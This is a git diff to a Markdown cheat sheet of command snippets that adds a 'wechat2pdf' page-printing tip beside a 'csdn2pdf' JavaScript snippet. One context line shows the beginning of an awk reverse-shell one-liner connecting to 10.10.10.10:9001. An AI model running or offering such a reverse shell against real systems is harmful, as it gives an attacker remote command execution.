@@ -30,6 +30,7 @@ instruction
 * [xxx2pdf](#xxx2pdf)
   * [freebuf2pdf](#freebuf2pdf)
   * [csdn2pdf](#csdn2pdf)
+  * [wechat2pdf](#wechat2pdf)
 
 <!-- 列表头 -->
 ## Rust
@@ -100,8 +101,16 @@ awk 'BEGIN {s = "/inet/tcp/0/10.10.10.10/9001"; while(42) { do{ printf "shell>" 
 ```
 ---
 ### csdn2pdf
+> ***2024-6-28: fb0sh***
 ```js
 ["toolbarBox", "rightAside", "pcCommentBox", "recommendNps", "toolBarBox"].forEach(i => document.getElementById(i).remove());["blog_container_aside", "recommend-box", "blog-footer-bottom", "csdn-side-toolbar"].forEach(c => document.getElementsByClassName(c)[0].remove());document.querySelectorAll("main")[0].setAttribute("style","width:95");window.print();
+```
+---
+### wechat2pdf
+> ***2024-6-28: fb0sh***
+也可直接使用edge快捷键Ctrl+P
+```js
+window.print();
 ```
 ---
 <!-- 列表尾 -->
